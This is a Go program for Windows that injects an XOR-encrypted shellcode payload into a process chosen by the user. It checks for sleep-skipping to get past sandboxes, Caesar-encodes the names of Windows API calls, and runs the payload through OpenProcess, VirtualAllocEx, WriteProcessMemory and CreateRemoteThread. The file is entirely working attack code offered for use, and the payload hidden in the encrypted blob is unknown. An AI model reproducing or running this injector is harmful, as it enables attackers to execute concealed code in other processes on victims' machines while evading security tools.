package main

import (
	"fmt"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Function prototypes
var (
	kernel32            = windows.NewLazySystemDLL("kernel32.dll")
	pOpenProcess        = kernel32.NewProc("OpenProcess")
	pVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	pWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	pCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
)

func CaesarEncrypt(text string, shift int) string {
	var result strings.Builder
	for _, char := range text {
		if char >= 'A' && char <= 'Z' {
			result.WriteRune((char-'A'+rune(shift))%26 + 'A')
		} else if char >= 'a' && char <= 'z' {
			result.WriteRune((char-'a'+rune(shift))%26 + 'a')
		} else {
			result.WriteRune(char)
		}
	}
	return result.String()
}

// Function to get the current tick count in milliseconds
func GetTickCount64() uint64 {
	tickCount, _, _ := windows.NewLazySystemDLL("kernel32.dll").NewProc("GetTickCount64").Call()
	return uint64(tickCount)
}

// Function to sleep for a specified number of milliseconds
func SleepWrapper(milliseconds uint32) {
	time.Sleep(time.Duration(milliseconds) * time.Millisecond)
}

func main() {
	// Check for sleep skips
	startTickCount := GetTickCount64()
	SleepWrapper(1000) // Sleep for 1 second
	endTickCount := GetTickCount64()
	sleepDuration := endTickCount - startTickCount

	// Check if sleep duration is less than expected (indicating a sleep skip)
	if sleepDuration < 1000 {
		fmt.Println("Sleep duration was less than expected. Possible sleep skip detected. Exiting...")
		return
	} else {
		fmt.Println("Sleep duration was as expected.")
	}

	// Define your encrypted shellcode directly
	shellcode := []byte{0x81, 0x63, 0xdd, 0x13, 0xaf, 0x4f, 0x4d, 0x9f, 0x9c, 0xf6, 0xd0, 0x91, 0xb0, 0xa, 0xff, 0x66, 0xca, 0xeb, 0xba, 0x3d, 0x2c, 0x14, 0x57, 0xd6, 0x79, 0xa4, 0x9f, 0xd3, 0x56, 0x36, 0x7, 0x2f, 0x59, 0x3d, 0x8f, 0x99, 0x46, 0xb4, 0x42, 0x2, 0x7b, 0xae, 0x8a, 0xe4, 0x4e, 0x3d, 0x6a, 0xc9, 0x6f, 0xc7, 0x51, 0x5b, 0x87, 0x3b, 0x33, 0x19, 0xf8, 0x2f, 0xac, 0x89, 0xbb, 0x9c, 0x43, 0xd2, 0x80, 0x1b, 0x44, 0x11, 0xbb, 0xc4, 0x88, 0x88, 0x21, 0xb7, 0x35, 0xba, 0xb3, 0xbf, 0x60, 0x25, 0x92, 0x9f, 0x79, 0x35, 0x1f, 0x79, 0xb, 0x49, 0xa9, 0x63, 0x4c, 0x2a, 0xa2, 0x30, 0xb8, 0xaf, 0xd4, 0xa8, 0xe1, 0x6e, 0xde, 0x82, 0x2b, 0x90, 0x59, 0x24, 0x84, 0x3, 0xe2, 0xd8, 0x40, 0xd3, 0xa6, 0x1, 0x59, 0xc0, 0x2a, 0xe4, 0xf, 0xf6, 0x39, 0xcb, 0xd, 0x18, 0x67, 0xc3, 0x66, 0x67, 0x55, 0xa9, 0x7f, 0x2a, 0x0, 0x48, 0x42, 0x91, 0x8f, 0x2b, 0xf, 0xc0, 0x59, 0x92, 0x8b, 0xbb, 0xd9, 0xe5, 0xfe, 0x10, 0x15, 0xa, 0x1b, 0x55, 0x2b, 0x76, 0xb, 0x48, 0x43, 0x88, 0x5f, 0x4d, 0x63, 0xdb, 0x11, 0xdf, 0x9a, 0x4a, 0xf8, 0xe3, 0xc3, 0xa6, 0xd8, 0x46, 0x12, 0x21, 0xca, 0xc7, 0xd6, 0x51, 0xef, 0x8c, 0x5, 0x38, 0xde, 0x10, 0xdf, 0x5b, 0x27, 0xc2, 0xaa, 0xfc, 0xae, 0x7d, 0xf7, 0x64, 0xd6, 0x13, 0x2b, 0xf6, 0x4b, 0xcb, 0xb8, 0xb, 0x9a, 0x2d, 0xd2, 0xa5, 0xcf, 0x63, 0x8d, 0xb7, 0x76, 0x37, 0xf3, 0x47, 0x38, 0x8d, 0xb4, 0x8a, 0xa3, 0x4f, 0x89, 0xc1, 0x2e, 0x9b, 0xa8, 0x93, 0x5f, 0x7a, 0xfa, 0xfb, 0x7a, 0x96, 0x68, 0x40, 0x21, 0xff, 0x36, 0xa8, 0x31, 0x88, 0x2e, 0xea, 0x12, 0x3d, 0x7b, 0x2, 0xcc, 0xb4, 0x35, 0xa5, 0x32, 0xc2, 0x9b, 0x4, 0x3b, 0x69, 0xdb, 0xd6, 0x1b, 0x62, 0xe4, 0x91, 0x34, 0xe3, 0x57, 0xfe, 0x6c, 0x65, 0xa0, 0x1f, 0xa5, 0x4d, 0xbd, 0xe8, 0xb4, 0x81, 0x69, 0xba, 0x1f, 0xc3, 0x37, 0xeb, 0x48, 0x1c, 0xab, 0x66, 0xbc, 0xf7, 0xb1, 0x40, 0x56, 0x66, 0x59, 0x78, 0xf5, 0xc, 0xcb, 0xbb, 0x1a, 0xda, 0x5c, 0x80, 0x4c, 0xe2, 0xf8, 0x7a, 0x89, 0x27, 0xf5, 0xf4, 0x30, 0x83, 0x78, 0x91, 0x5a, 0x9b, 0xdd, 0x65, 0x7e, 0x1b, 0x61, 0x92, 0x39, 0xc0, 0xfc, 0x5d, 0x7, 0xeb, 0x9, 0x2d, 0x2d, 0x93, 0xc1, 0x4c, 0x6e, 0x6e, 0x56, 0x4a, 0x36, 0x23, 0x91, 0xc4, 0x63, 0xbe, 0x6, 0x18, 0xa2, 0xfa, 0xb4, 0x27, 0x8b, 0xfb, 0x6, 0xe9, 0x32, 0xe4, 0xad, 0xd4, 0x72, 0x6b, 0xac, 0x3e, 0x30, 0x50, 0x75, 0x40, 0xb0, 0x60, 0x6c, 0xaf, 0xe6, 0x33, 0xcd, 0xf1, 0x85, 0xa0, 0xe4, 0x9c, 0x3f, 0x34, 0x27, 0x89, 0x2c, 0x47, 0xee, 0x2d, 0x91, 0x1a, 0x45, 0xb7, 0xda, 0x3, 0xc6, 0xf9, 0xc9, 0x22, 0xfd, 0xcb, 0x82, 0xe1, 0x52, 0x52, 0xf3, 0x66, 0x6a, 0x32, 0x25, 0x97, 0xb5, 0x49, 0xad, 0xb0, 0x83, 0x25, 0x43, 0xe4, 0x1c, 0xd6, 0x13, 0xbb, 0xa, 0x22, 0x82, 0xe3, 0x5e, 0x67, 0x56, 0x86, 0xae, 0x50, 0x46, 0x94, 0xe6, 0xf6, 0x89, 0xbf, 0x62, 0xce, 0xe7, 0x53, 0xf8, 0x9b, 0xe9, 0x2e, 0xdc, 0xf2, 0xe8, 0xc7, 0xd7, 0x2b, 0xb8, 0xe0, 0xf4, 0xe9, 0x1f, 0xff, 0x89, 0x59, 0x39, 0x91, 0xcf, 0x89, 0xe0, 0x6b, 0x88, 0x12, 0xc3, 0x47, 0xfb, 0xf1, 0x7, 0xeb, 0x90, 0x95, 0xa1, 0x48, 0xe6, 0x7c, 0xa4, 0x11, 0xbc, 0x4, 0x8a, 0x5, 0x3d, 0x75, 0x1a, 0x7e, 0x6b, 0xc7, 0x46, 0x13, 0xed, 0xb, 0xb5, 0xc5, 0x8f, 0x2, 0x11, 0x92, 0x64, 0x8f, 0xf7, 0x66, 0x40, 0xa3, 0xe4, 0x55, 0xb9, 0x5a}
	// Define your decryption key
	key := []byte{0x7d, 0x2b, 0x5e, 0xf7, 0x5f, 0xa7, 0x81, 0x9f, 0x9c, 0xf6, 0x91, 0xc0, 0xf1, 0x5a, 0xad, 0x37, 0x82, 0xda, 0x68, 0x6b, 0x49, 0x5c, 0xdc, 0x84, 0x19, 0xec, 0x14, 0x81, 0x4e, 0x7e, 0x8c, 0x7d, 0x79, 0x70, 0xbe, 0x50, 0xe, 0xbb, 0xf5, 0x48, 0x31, 0xe6, 0x1, 0x96, 0x1e, 0x75, 0x5b, 0x9, 0xc3, 0xfb, 0x30, 0x27, 0x85, 0x17, 0x13, 0x58, 0x39, 0xe6, 0xa1, 0xc8, 0xba, 0x5d, 0xa1, 0x3f, 0xd2, 0x53, 0xcf, 0x43, 0x9b, 0x85, 0xd9, 0x3, 0x63, 0x8b, 0x7d, 0xbb, 0x63, 0xd9, 0xe1, 0x5d, 0x8a, 0x94, 0x7b, 0x3a, 0x9a, 0xb, 0xb, 0x49, 0xa9, 0xe8, 0xcc, 0xa2, 0xa2, 0x30, 0xb8, 0xe7, 0x51, 0x68, 0x95, 0x9, 0x96, 0x83, 0xfb, 0x1b, 0x11, 0x3c, 0xc0, 0x88, 0xa2, 0xf8, 0x9, 0xd2, 0x76, 0x51, 0xba, 0x96, 0x67, 0xd5, 0xc6, 0xbe, 0xc6, 0x2, 0x4c, 0x93, 0x53, 0x4b, 0x2e, 0x66, 0x83, 0xe1, 0x4e, 0xea, 0xac, 0x9, 0x83, 0x58, 0x82, 0x6a, 0xe, 0x1, 0x61, 0x72, 0xfe, 0x4a, 0x95, 0xe6, 0xb2, 0x34, 0x1d, 0x4f, 0x22, 0x84, 0x5e, 0xae, 0x53, 0xc, 0xc8, 0xc8, 0x7b, 0x4, 0x62, 0xb, 0x77, 0x9e, 0x11, 0x46, 0xb0, 0xa7, 0x48, 0xe6, 0xc4, 0xf, 0x13, 0xf1, 0x8b, 0x4c, 0xd2, 0xd9, 0xae, 0xd4, 0x44, 0x60, 0x80, 0x58, 0xde, 0x8b, 0x7e, 0x98, 0xeb, 0xa4, 0xef, 0x24, 0xb6, 0x3e, 0x9e, 0x90, 0xc7, 0xd6, 0xa, 0x99, 0x47, 0xeb, 0xc2, 0x6c, 0x8b, 0xff, 0x87, 0xe8, 0x9f, 0x5e, 0x3d, 0xc8, 0xc, 0xb8, 0x65, 0xc4, 0xa, 0xfd, 0xd0, 0x7d, 0xd6, 0xf2, 0x1c, 0x9b, 0xa8, 0xd2, 0x9, 0x33, 0x73, 0x1d, 0x32, 0x17, 0x84, 0xe0, 0x20, 0xff, 0x36, 0xe1, 0xb8, 0x6d, 0x67, 0x56, 0x10, 0x3d, 0x5b, 0xf9, 0xc, 0x1c, 0x37, 0x24, 0x73, 0x96, 0xd2, 0x8d, 0xdf, 0x25, 0x52, 0x27, 0x5a, 0xd8, 0xa8, 0xe6, 0x12, 0xe4, 0xa8, 0x2b, 0x20, 0xec, 0x4a, 0x77, 0xa4, 0x4c, 0xbd, 0xe8, 0xed, 0xc0, 0xd3, 0x93, 0x9f, 0xa8, 0x37, 0x14, 0x9d, 0x76, 0xa1, 0x27, 0xe2, 0xa7, 0xe1, 0xd, 0x67, 0xaf, 0x14, 0x49, 0x35, 0x44, 0x34, 0x7b, 0x52, 0x53, 0x9e, 0xc8, 0xb3, 0x22, 0xb0, 0xf3, 0x48, 0x66, 0x4f, 0x1e, 0x3f, 0x5c, 0x98, 0x6e, 0x8f, 0xd3, 0x54, 0xa2, 0x14, 0xb, 0x20, 0xca, 0x75, 0x49, 0x1e, 0x15, 0x8e, 0x12, 0x48, 0x97, 0xb4, 0x36, 0xb5, 0x2d, 0x91, 0xbb, 0xd3, 0x8a, 0x42, 0x29, 0xd8, 0x3b, 0xad, 0xcb, 0xe3, 0xf0, 0x31, 0xfa, 0xb4, 0x27, 0xc3, 0x78, 0xea, 0xf9, 0x7a, 0x6d, 0x4f, 0x99, 0x43, 0xa2, 0xc6, 0x3a, 0x71, 0x8, 0x3d, 0xc9, 0x49, 0x21, 0xd6, 0xad, 0x3f, 0xfb, 0x92, 0xe, 0x50, 0x23, 0x1c, 0x9c, 0x41, 0x61, 0x6f, 0xa, 0xe8, 0x67, 0xb0, 0xa4, 0x67, 0x70, 0x5, 0xf6, 0x83, 0x6b, 0xc6, 0xe9, 0xc9, 0x22, 0xbc, 0x93, 0xca, 0x68, 0xa0, 0x1a, 0xc2, 0xaf, 0x2b, 0x88, 0x7d, 0x33, 0xe6, 0xac, 0x52, 0x65, 0xcb, 0xac, 0x80, 0xad, 0x95, 0x11, 0x5e, 0x8a, 0xc3, 0x6b, 0xb, 0x13, 0x16, 0xee, 0x8c, 0xce, 0x27, 0xa9, 0x7, 0x2e, 0xe4, 0x2f, 0x41, 0xe0, 0x9d, 0x1b, 0x64, 0xab, 0xf8, 0xe6, 0xc1, 0x76, 0x9d, 0xa5, 0xb1, 0xaf, 0xd7, 0x6b, 0xb8, 0xe0, 0xb5, 0xb1, 0x75, 0xff, 0xd3, 0x18, 0x83, 0x9a, 0xe0, 0x86, 0xd0, 0x94, 0x5d, 0x45, 0x9a, 0x6, 0x41, 0x84, 0x69, 0xa6, 0xf1, 0x6a, 0x74, 0x1, 0x19, 0xb2, 0x4d, 0x2d, 0x43, 0xfb, 0x75, 0x4d, 0x3c, 0xb6, 0x52, 0x57, 0xad, 0x8f, 0xc3, 0xe5, 0x98, 0xbf, 0xf4, 0x3a, 0x68, 0x5a, 0x7b, 0x92, 0x3d, 0xc6, 0x30, 0xa4, 0xb0, 0x16, 0x46, 0x3, 0x46, 0x8f}

	// Decrypt the shellcode
	for i := 0; i < len(shellcode); i++ {
		shellcode[i] ^= key[i%len(key)]
	}

	// Enter the process ID to inject into
	var processId uint32
	fmt.Print("Enter Process ID to inject: ")
	fmt.Scan(&processId)

	// Encrypted names using Caesar cipher
	openProcessName := "UvktVxuikyy"
	virtualAllocExName := "ZmvxyepEppsgIb"
	writeProcessMemoryName := "TofqbMolzbppJbjlov"
	createRemoteThreadName := "YnawpaNaikpaPdnawz"

	// Decrypt function names
	openProcessName = CaesarEncrypt(openProcessName, 6)
	virtualAllocExName = CaesarEncrypt(virtualAllocExName, 4)
	writeProcessMemoryName = CaesarEncrypt(writeProcessMemoryName, 23)
	createRemoteThreadName = CaesarEncrypt(createRemoteThreadName, 22)

	// Dynamically load the functions
	hProcess, _, _ := pOpenProcess.Call(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ,
		0, uintptr(processId))

	if hProcess == 0 {
		fmt.Printf("Failed to open process. Error code: %d\n", windows.GetLastError())
		return
	}

	fmt.Printf("Got procHandle: %d\n", hProcess)

	execMemory, _, _ := pVirtualAllocEx.Call(hProcess, 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
	if execMemory == 0 {
		fmt.Println("VirtualAlloc failed.")
		windows.CloseHandle(windows.Handle(hProcess))
		return
	}

	writtenBytes := 0
	pWriteProcessMemory.Call(hProcess, execMemory, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), uintptr(unsafe.Pointer(&writtenBytes)))
	if writtenBytes != len(shellcode) {
		fmt.Println("WriteProcessMemory failed.")
		windows.CloseHandle(windows.Handle(hProcess))
		return
	}

	threadHandle, _, _ := pCreateRemoteThread.Call(hProcess, 0, 0, execMemory, 0, 0, 0)
	if threadHandle == 0 {
		fmt.Println("CreateRemoteThread failed.")
		windows.CloseHandle(windows.Handle(hProcess))
		return
	}

	// Wait for the thread to complete
	windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)

	// Clean up
	windows.CloseHandle(windows.Handle(threadHandle))
	windows.CloseHandle(windows.Handle(hProcess))

	fmt.Println("Execution completed.")
}
